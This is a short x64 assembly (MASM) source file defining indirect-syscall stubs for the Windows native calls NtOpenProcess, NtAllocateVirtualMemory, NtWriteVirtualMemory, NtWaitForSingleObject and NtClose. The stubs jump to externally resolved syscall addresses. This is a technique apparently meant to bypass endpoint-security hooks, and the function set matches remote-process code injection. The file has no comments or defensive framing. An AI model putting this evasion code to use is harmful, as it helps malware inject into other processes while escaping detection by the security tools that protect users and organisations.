.data

EXTERN thNtOpenProcess:DWORD          
EXTERN NtOpenProcessSys:QWORD
EXTERN thNtAllocateVirtualMemory:DWORD
EXTERN NtAllocateVirtualMemorySys:QWORD
EXTERN thNtWriteVirtualMemory:DWORD
EXTERN NtWriteVirtualMemorySys:QWORD  
EXTERN thNtWaitForSingleObject:DWORD
EXTERN NtWaitForSingleObjectSys:QWORD 
EXTERN thNtClose:DWORD
EXTERN NtCloseSys:QWORD

.code

NtOpenProcess proc
		mov r10, rcx
		mov eax, thNtOpenProcess       
		jmp qword ptr [NtOpenProcessSys]                         
		ret                             
NtOpenProcess endp

NtAllocateVirtualMemory proc
		mov r10, rcx
		mov eax, thNtAllocateVirtualMemory     
		jmp qword ptr [NtAllocateVirtualMemorySys]                        
		ret                             
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
		mov r10, rcx
		mov eax, thNtWriteVirtualMemory     
		jmp qword ptr [NtWriteVirtualMemorySys]                        
		ret                             
NtWriteVirtualMemory endp

NtWaitForSingleObject proc
		mov r10, rcx
		mov eax, thNtWaitForSingleObject     
		jmp qword ptr [NtWaitForSingleObjectSys]                        
		ret                             
NtWaitForSingleObject endp

NtClose proc
		mov r10, rcx
		mov eax, thNtClose     
		jmp qword ptr [NtCloseSys]                        
		ret                             
NtClose endp
end